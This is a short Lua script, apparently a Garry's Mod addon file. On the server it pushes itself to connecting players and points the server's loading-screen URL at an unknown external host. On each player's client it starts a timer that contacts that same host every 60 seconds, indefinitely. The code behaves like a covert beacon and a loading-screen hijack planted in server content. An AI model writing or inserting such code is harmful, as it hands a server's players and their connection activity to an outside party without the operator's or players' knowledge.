local url = "http://idc.wolf10280809909.top:28080/"

if SERVER then
    AddCSLuaFile()
    RunConsoleCommand("sv_loadingurl", url)
    return
end

local function heartbeat()
    http.Fetch(url, function(body, len, headers, code)
        print("IDC: " .. body)
    end, function(error)
        print("Error: " .. error)
    end)
end

timer.Create("heartbeat", 60, 0, heartbeat)